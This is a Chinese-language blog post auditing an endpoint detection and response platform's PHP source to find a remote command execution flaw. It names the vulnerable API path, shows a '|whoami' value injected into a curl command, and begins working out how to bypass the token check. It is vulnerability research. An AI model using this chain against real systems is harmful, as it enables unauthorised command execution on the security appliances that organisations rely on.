@@ -1,0 +1,318 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>某终端检测响应平台代码审计挖掘（RCE） · Chen's Blog</title> <meta name="description" content="某终端检测响应平台代码审计挖掘（RCE）"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2020-09-03/4"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> </head> <body> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">ᴀᴜᴛʜᴏʀ: ᴠᴜʟᴋᴇʏ_ᴄʜᴇɴ</h1> <div class="divider"></div> <center><a href="/about" target="_blank">ᴀʙᴏᴜᴛ</a> | <a href="/links" target="_blank">ʟɪɴᴋs</a> | <a href="/AssistTool" target="_blank">ᴀssɪsᴛ ᴛᴏᴏʟ</a> | <a href="/Binary-Learning" target="_blank">ʙɪɴᴀʀʏ ʟᴇᴀʀɴɪɴɢ</a></center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">某终端检测响应平台代码审计挖掘（RCE）</h1> <time class="code">September 3, 2020</time> </div> <div class="divider"></div> <h1 id="某终端检测响应平台代码审计挖掘rce">某终端检测响应平台代码审计挖掘（RCE）</h1> <h2 id="前言">前言</h2> <p>继上一次对某终端检测响应平台<strong>权限绕过</strong>漏洞的审计流程，现分享对该平台进行代码审计后挖掘到的远程命令执行漏洞。</p> <p>上篇文章其实采用的是通读代码逻辑的方法进行漏洞挖掘，那么本次我们使用敏感函数回溯的方法（代码审计方法通常分为三类: 通读全文、敏感函数参数回溯、定向功能分析）来进行漏洞挖掘。</p> <h2 id="审计流程">审计流程</h2> <h2 id="定位敏感函数">定位敏感函数</h2> <p>前文说到，不是一把梭的0day都不叫0day，所以我们可以对命令执行、代码执行等漏洞相关敏感函数进行全文搜索，敏感函数列表如下 :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec</span><span class="p">()</span>
+<span class="nb">passthru</span><span class="p">()</span>
+<span class="nb">proc_open</span><span class="p">()</span>
+<span class="nb">shell_exec</span><span class="p">()</span>
+<span class="nb">system</span><span class="p">()</span>
+<span class="nb">popen</span><span class="p">()</span>
+<span class="k">eval</span><span class="p">()</span> <span class="c1">//非函数</span>
+<span class="nb">assert</span><span class="p">()</span>
+<span class="nb">preg_replace</span><span class="p">()</span>
+</code></pre></div></div> <p>搜索关键词 <code class="language-plaintext highlighter-rouge">exec(</code>，发现一处文件 <code class="language-plaintext highlighter-rouge">/ldb/dc.php</code> 自定义了命令执行代码，函数体是调用的 <code class="language-plaintext highlighter-rouge">exec</code> 函数 :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * 执行外部程序
+ * @param string $command 执行命令
+ * @param array  $output  输出信息
+ * @param int    $ret     返回值
+ * @return string 返回执行结果
+ */</span>
+<span class="k">function</span> <span class="nf">ldb_exec</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$output</span><span class="p">,</span> <span class="o">&amp;</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">ldb_is_linux</span><span class="p">())</span> <span class="p">{</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$ret</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">pcntl_signal</span><span class="p">(</span><span class="nx">SIGCHLD</span><span class="p">,</span> <span class="nx">SIG_DFL</span><span class="p">);</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$ret</span><span class="p">);</span>
+        <span class="nb">pcntl_signal</span><span class="p">(</span><span class="nx">SIGCHLD</span><span class="p">,</span> <span class="nx">SIG_IGN</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <h2 id="寻找危险点">寻找危险点</h2> <h3 id="binmapreduceappwebdevice_linkageprocess_csspphp">/bin/mapreduce/app/web/device_linkage/process_cssp.php</h3> <h4 id="exec_slog_action-匿名函数分析">exec_slog_action 匿名函数分析</h4> <p>如上所述，我们知道了 <code class="language-plaintext highlighter-rouge">ldb_exec</code> 函数为自定义命令执行代码，我们想寻找利用点就需要跟踪下该函数在哪被引用，然后分析具体的代码看是否可以利用。</p> <p>老套路，全局搜索 <code class="language-plaintext highlighter-rouge">ldb_exec(</code> 发现有很多处调用了，其中阅读起来较为通俗易懂的为 <code class="language-plaintext highlighter-rouge">/bin/mapreduce/app/web/device_linkage/process_cssp.php</code> 的匿名函数 <code class="language-plaintext highlighter-rouge">$exec_slog_action</code> :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$exec_slog_action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="nv">$object</span><span class="p">,</span><span class="nv">$params</span><span class="p">){</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="s2">"data"</span><span class="p">];</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">"params"</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nx">ldb_error</span><span class="p">(</span><span class="s2">"required parameter missing params is"</span><span class="o">.</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$params</span><span class="p">));</span>
+        <span class="nv">$object</span><span class="o">-&gt;</span><span class="na">err_code</span> <span class="o">=</span> <span class="nx">EXEC_SLOG_ACTION_PARAM_ERROR</span><span class="p">;</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$data</span><span class="p">[</span><span class="s2">"params"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ldb_mapreduce_invoke</span><span class="p">(</span><span class="s2">"call_method"</span><span class="p">,</span> <span class="s2">"app.web.common.validation.shell_injection_check"</span><span class="p">,</span>
+        <span class="s2">"shell_argv_transform"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s2">"params"</span><span class="p">]);</span>
+
+    <span class="nv">$command</span> <span class="o">=</span> <span class="s2">"curl -k 'http://127.0.0.1:9081/?"</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s2">"params"</span><span class="p">]</span><span class="o">.</span><span class="s2">"'"</span><span class="p">;</span>
+    <span class="nx">ldb_debug</span><span class="p">(</span><span class="s2">"exec command: "</span><span class="o">.</span><span class="nv">$command</span><span class="p">);</span>
+    <span class="nx">ldb_exec</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$ret</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$ret</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">ldb_error</span><span class="p">(</span><span class="s2">"exec slog action fail, command: </span><span class="nv">$command</span><span class="s2">, error: "</span><span class="o">.</span><span class="nv">$output</span><span class="p">);</span>
+        <span class="nv">$object</span><span class="o">-&gt;</span><span class="na">err_code</span> <span class="o">=</span> <span class="nx">EXEC_SLOG_ACTION_FAILED</span><span class="p">;</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$output</span><span class="p">;</span>
+    <span class="nx">response_linkage_dev_msg</span><span class="p">(</span><span class="nx">SUCCESS</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div> <p>这段代码很容易理解，赋值校验，再过一遍 <code class="language-plaintext highlighter-rouge">/bin/mapreduce/app/web/common/validation/shell_injection_check</code> 文件 函数 <code class="language-plaintext highlighter-rouge">shell_argv_transform</code> :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 转义参数</span>
+<span class="nv">$shell_argv_transform</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="nv">$argv</span><span class="p">)</span> <span class="nx">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$shell_argv_transform</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$type</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">gettype</span><span class="p">(</span><span class="nv">$argv</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s2">"array"</span><span class="p">)</span> 
+    <span class="p">{</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$argv</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nv">$argv</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$shell_argv_transform</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> 
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$argv</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$argv</span><span class="p">))</span> 
+    <span class="p">{</span>
+        <span class="nv">$argv</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="nv">$argv</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div> <p>这就是一段简单的转义，如果传入的变量 <code class="language-plaintext highlighter-rouge">$argv</code> 是数组则遍历进行函数递归最后通过 <code class="language-plaintext highlighter-rouge">escapeshellarg</code> 函数转义（ 官方释义: <strong>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。</strong> ），如果不是数组则直接进行增加转义。</p> <p>继续跟进看代码，你会发现 <code class="language-plaintext highlighter-rouge">$command = "curl -k 'http://127.0.0.1:9081/?".$data["params"]."'";</code> 是拼接的，最后经过 <code class="language-plaintext highlighter-rouge">ldb_exec</code> 进行命令执行，我们可以使用管道符的方式进行其他命令的注入: <code class="language-plaintext highlighter-rouge">|whoami</code>，但这里巧妙的是经过 <code class="language-plaintext highlighter-rouge">escapeshellarg</code> 函数处理后注入的命令就变成了 <code class="language-plaintext highlighter-rouge">'|whoami'</code>，最后执行的命令就变成了: <code class="language-plaintext highlighter-rouge">curl -k 'http://127.0.0.1:9081/?'|whoami''</code>，直接帮助我们闭合命令了。</p> <p>那么我们只需要可以控制 <code class="language-plaintext highlighter-rouge">$params['data']['params']</code> 的值即可进行命令执行。</p> <h2 id="控制点寻找">控制点寻找</h2> <h3 id="binwebdev_linkage_launchphp">/bin/web/dev_linkage_launch.php</h3> <h4 id="get_opr-函数分析">get_opr 函数分析</h4> <p>由于 <code class="language-plaintext highlighter-rouge">/bin/mapreduce/</code> 下的文件，我们没办法直接访问调用就需要全局搜索 <code class="language-plaintext highlighter-rouge">exec_slog_action</code> 看下谁调用了这段代码，发现文件 <code class="language-plaintext highlighter-rouge">/bin/web/dev_linkage_launch.php</code>（ 此处应感觉到兴奋，毕竟我们能访问的路径就是 <code class="language-plaintext highlighter-rouge">/bin/web/</code> ） 有一处可疑函数体（ 函数 <code class="language-plaintext highlighter-rouge">get_opr</code> ） :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">get_opr</span><span class="p">(</span><span class="nv">$req_url</span><span class="p">){</span>
+    <span class="o">...</span>
+    <span class="c1">//CSSP请求</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$req_url</span> <span class="o">===</span> <span class="nx">STD_CSSP_EXEC_SLOG_ACTION_URL</span> <span class="p">){</span>
+        <span class="k">return</span> <span class="nx">EXEC_SLOG_ACTION</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="o">...</span>
+    <span class="c1">//检查url的合法性</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$req_url</span> <span class="o">!==</span> <span class="nx">AGENT_INFO_URL</span> <span class="o">&amp;&amp;</span>
+       <span class="nv">$req_url</span> <span class="o">!==</span> <span class="nx">SCAN_ABOUT_URL</span> <span class="o">&amp;&amp;</span>
+       <span class="nv">$req_url</span> <span class="o">!==</span> <span class="nx">EDR_INFO_ABOUT_URL</span> <span class="o">&amp;&amp;</span>
+       <span class="nv">$req_url</span> <span class="o">!==</span> <span class="nx">EVIDENCE_INFO_URL</span><span class="p">){</span>
+        <span class="nx">ldb_error</span><span class="p">(</span><span class="s2">"no response about this url :"</span><span class="o">.</span><span class="nv">$req_url</span><span class="p">);</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="nx">ldb_get_lang</span><span class="p">(</span><span class="s2">"NO_RESPONSE_ABOUT_THIS_URL"</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="c1">//获取url中的参数</span>
+    <span class="nv">$url_params</span> <span class="o">=</span> <span class="nx">get_url_param</span><span class="p">();</span>
+    <span class="nv">$method</span> <span class="o">=</span> <span class="nv">$url_params</span><span class="p">[</span><span class="nx">METHOD</span><span class="p">];</span>
+    <span class="k">global</span> <span class="nv">$opr_arr</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$opr_arr</span><span class="p">[</span><span class="nv">$method</span><span class="p">])){</span>
+        <span class="nv">$opr</span> <span class="o">=</span> <span class="nv">$opr_arr</span><span class="p">[</span><span class="nv">$method</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">else</span><span class="p">{</span><span class="c1">//无此url的响应</span>
+        <span class="nx">ldb_error</span><span class="p">(</span><span class="s2">"no response about this url: "</span> <span class="o">.</span><span class="nv">$req_url</span><span class="p">);</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="nx">ldb_get_lang</span><span class="p">(</span><span class="s2">"NO_RESPONSE_ABOUT_THIS_URL"</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$opr</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>判断变量 <code class="language-plaintext highlighter-rouge">$req_url</code> 值是否与常量 <code class="language-plaintext highlighter-rouge">STD_CSSP_EXEC_SLOG_ACTION_URL</code> 值一致，一致则返回常量 <code class="language-plaintext highlighter-rouge">EXEC_SLOG_ACTION</code>，最后如果请求的地址非常量中定义的，则进行URL判断合法性（ 我们没办法直接访问 <code class="language-plaintext highlighter-rouge">dev_linkage_launch.php</code> ）。</p> <p>我们先看常量 <code class="language-plaintext highlighter-rouge">STD_CSSP_EXEC_SLOG_ACTION_URL</code> 对应值，直接看代码开头包含了哪些文件即可 :</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15981261213631.jpg" alt="-w938" /></p> <p>最终发现 <code class="language-plaintext highlighter-rouge">/bin/mapreduce/app/web/device_linkage/common/common.php</code> 中定义了常量 :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">define</span><span class="p">(</span><span class="s2">"STD_CSSP_EXEC_SLOG_ACTION_URL"</span><span class="p">,</span><span class="s2">"/api/edr/sangforinter/v2/cssp/slog_client"</span><span class="p">);</span>
+</code></pre></div></div> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">define</span><span class="p">(</span><span class="s2">"EXEC_SLOG_ACTION"</span><span class="p">,</span><span class="s2">"exec_slog_action"</span><span class="p">);</span>
+</code></pre></div></div> <p>知道了这些常量的定义，大致就明白了，<strong>（ 猜测 ）</strong>当我们访问 <code class="language-plaintext highlighter-rouge">/api/edr/sangforinter/v2/cssp/slog_client</code> 时，函数 <code class="language-plaintext highlighter-rouge">get_opr</code> 返回 <code class="language-plaintext highlighter-rouge">exec_slog_action</code>，也就是我们之前所发现存在安全风险的函数，这也仅仅是猜测，但想要证实这个猜测，我们就得啃一啃文件 <code class="language-plaintext highlighter-rouge">/bin/web/dev_linkage_launch.php</code>。</p> <h4 id="get_interface_data-函数分析">get_interface_data 函数分析</h4> <p>我们已经知道了函数 <code class="language-plaintext highlighter-rouge">get_opr</code> 的作用（ 返回接口方法 ），来看看在文件中的哪里被调用，发现一处调用 :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">get_interface_data</span><span class="p">(</span><span class="nv">$argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">//获取url</span>
+    <span class="nv">$req_url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">];</span>
+    <span class="c1">//校验token</span>
+    <span class="nx">check_token</span><span class="p">(</span><span class="nv">$req_url</span><span class="p">);</span>
+    <span class="c1">//构造opr</span>
+    <span class="nv">$opr</span> <span class="o">=</span> <span class="nx">get_opr</span><span class="p">(</span><span class="nv">$req_url</span><span class="p">);</span>
+    <span class="c1">//根据方法构造业务代码路径</span>
+    <span class="nv">$app_name</span> <span class="o">=</span> <span class="nx">get_app_name</span><span class="p">(</span><span class="nv">$opr</span><span class="p">);</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">){</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nx">get_body_data</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">//根据opr、app_name以及data构造数据</span>
+    <span class="nv">$interface_data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="nv">$interface_data</span><span class="p">[</span><span class="s2">"app_args"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$app_name</span><span class="p">;</span>
+    <span class="nv">$interface_data</span><span class="p">[</span><span class="s2">"opr"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$opr</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">){</span>
+        <span class="nv">$interface_data</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$interface_data</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 调用了函数 <code class="language-plaintext highlighter-rouge">get_opr</code>，传递参数值为 <code class="language-plaintext highlighter-rouge">$req_url = $_SERVER['PHP_SELF'];</code>，也就是请求的 <code class="language-plaintext highlighter-rouge">URI</code> ( 例如请求地址为 <code class="language-plaintext highlighter-rouge">http://localhost/chen.php</code> 那么 <code class="language-plaintext highlighter-rouge">$_SERVER['PHP_SELF']</code> 的值即为 <code class="language-plaintext highlighter-rouge">/chen.php</code> )。</p> <p><strong>注</strong>：这里证实了我们在分析 <code class="language-plaintext highlighter-rouge">get_opr</code> 函数时的猜测，请求的地址必须为 <code class="language-plaintext highlighter-rouge">/bin/mapreduce/app/web/device_linkage/common/common.php</code> 文件中定义常量的地址，不能为 <code class="language-plaintext highlighter-rouge">dev_linkage_launch.php</code>。</p> <p>那么想要进入调用函数 <code class="language-plaintext highlighter-rouge">get_opr</code> 的逻辑，我们需要先了解下函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 的逻辑，在此之前我们需要确保自己不会做<strong>无用功</strong>，所以需要看下函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 是否在上下文代码中被调用 :</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15981340754516.jpg" alt="-w711" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15981340883961.jpg" alt="-w289" /></p> <p>该函数直接被入口函数调用，那么我们接下来就可以分析下该函数逻辑，根据注释我们了解到这里会校验token，也就是函数 <code class="language-plaintext highlighter-rouge">check_token</code>。</p> <h5 id="check_token-绕过">check_token 绕过</h5> <p>跟进函数 <code class="language-plaintext highlighter-rouge">check_token</code>，其代码如下 :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * @func        检验token
+ * @param       string $req_url 联动的url
+ * @throws      Exception
+ */</span>
+<span class="k">function</span> <span class="nf">check_token</span><span class="p">(</span><span class="nv">$req_url</span><span class="p">){</span>
+    <span class="c1">//CSSP接口使用特权IP的方式进行校验</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$req_url</span><span class="p">,</span> <span class="nx">STD_CSSP_REQUEST_URL_PREFIX</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="o">&amp;&amp;</span> <span class="nv">$req_url</span> <span class="o">!=</span> <span class="nx">STD_CSSP_SET_KEY_URL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">parse_str</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">],</span><span class="nv">$query_str_parsed</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$query_str_parsed</span><span class="p">[</span><span class="nx">TOKEN</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="nx">ldb_get_lang</span><span class="p">(</span><span class="s2">"THIS_OPERATION_NEED_TOKEN"</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">check_access_token</span><span class="p">(</span><span class="nv">$query_str_parsed</span><span class="p">[</span><span class="nx">TOKEN</span><span class="p">],</span> <span class="nv">$req_url</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$ret</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">response_linkage_dev_msg</span><span class="p">(</span><span class="nx">CSSP_TOKEN_AUTH_FAILED</span><span class="p">);</span>
+            <span class="k">die</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="c1">//判断url 需不需要进行校验token</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$req_url</span> <span class="o">==</span> <span class="nx">AGENT_INFO_URL</span> <span class="o">||</span>
+       <span class="nv">$req_url</span> <span class="o">==</span> <span class="nx">SCAN_ABOUT_URL</span> <span class="o">||</span>
+       <span class="nv">$req_url</span> <span class="o">==</span> <span class="nx">EDR_INFO_ABOUT_URL</span> <span class="o">||</span>
+       <span class="nv">$req_url</span> <span class="o">==</span> <span class="nx">EVIDENCE_INFO_URL</span><span class="p">){</span>
+        <span class="c1">//校验token</span>
+        <span class="nv">$url_params</span> <span class="o">=</span> <span class="nx">get_url_param</span><span class="p">();</span>
+        <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">token_valid</span><span class="p">(</span><span class="nv">$url_params</span><span class="p">[</span><span class="nx">TOKEN</span><span class="p">]);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span><span class="p">){</span>
+            <span class="nx">response_linkage_dev_msg</span><span class="p">(</span><span class="nv">$ret</span><span class="p">);</span>
+            <span class="k">die</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>简单理解就是获取所有请求参数，并获取参数 <code class="language-plaintext highlighter-rouge">token</code> 的值带入函数 <code class="language-plaintext highlighter-rouge">check_access_token</code>，最后的返回结果不为 <code class="language-plaintext highlighter-rouge">1</code> 即可成功验证token，我们继续跟进该函数，文件 <code class="language-plaintext highlighter-rouge">/bin/web/ui/php/platform.php</code> :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * 检验cssp请求的token
+ * @return 0/1 成功/失败
+ */</span>
+<span class="k">function</span> <span class="nf">check_access_token</span><span class="p">(</span><span class="nv">$access_token</span><span class="p">,</span> <span class="nv">$req_url</span><span class="p">){</span>
+
+    <span class="nv">$token_str</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$access_token</span><span class="p">);</span>
+    <span class="nv">$json_token</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$token_str</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">get_item_from_os_json</span><span class="p">(</span><span class="s2">"privateKey"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">==</span> <span class="s2">""</span> <span class="o">&amp;&amp;</span> <span class="nv">$req_url</span> <span class="o">==</span> <span class="nx">STD_CSSP_DOWN_CONF_URL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$key</span> <span class="o">=</span> <span class="nx">STD_CSSP_DEFAULT_KEY</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$md5_str</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$key</span><span class="o">.</span><span class="nv">$json_token</span><span class="p">[</span><span class="s2">"random"</span><span class="p">]);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$md5_str</span> <span class="o">==</span> <span class="nv">$json_token</span><span class="p">[</span><span class="s2">"md5"</span><span class="p">])</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">ldb_error</span><span class="p">(</span><span class="s2">"check token failed"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>参数 <code class="language-plaintext highlighter-rouge">token</code> 的值需要经过Base64解码、JSON转换（ 将JSON转为数组 ），最后字段 <code class="language-plaintext highlighter-rouge">random</code> 与变量 <code class="language-plaintext highlighter-rouge">$key</code> 拼接进行md5加密的值与字段 <code class="language-plaintext highlighter-rouge">md5</code> 一样则可以进入 <code class="language-plaintext highlighter-rouge">return 0;</code> 否则就是 <code class="language-plaintext highlighter-rouge">return 1;</code>（ 我们就需要返回为0才可过token验证 ）。</p> <p>那在这我们需要知道变量 <code class="language-plaintext highlighter-rouge">$key</code> 是怎么样获取到的，跟进函数 <code class="language-plaintext highlighter-rouge">get_item_from_os_json</code> :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * 从/etc/cssp_custom_image/os.json中获取指定值
+ * @param $key os.json中的键
+ * @return 返回指定键对应的值
+ */</span>
+<span class="k">function</span> <span class="nf">get_item_from_os_json</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
+    <span class="nv">$item</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+
+    <span class="nv">$file_path</span> <span class="o">=</span> <span class="s2">"/etc/cssp_custom_image/os.json"</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">)){</span>
+        <span class="nv">$os_json</span> <span class="o">=</span> <span class="nx">get_json_from_file</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$os_json</span> <span class="o">===</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">ldb_error</span><span class="p">(</span><span class="s2">"target file is null"</span><span class="p">);</span>
+            <span class="k">return</span> <span class="s2">""</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$item</span> <span class="o">=</span> <span class="nv">$os_json</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nv">$item</span><span class="p">;</span>
+<span class="p">}</span>
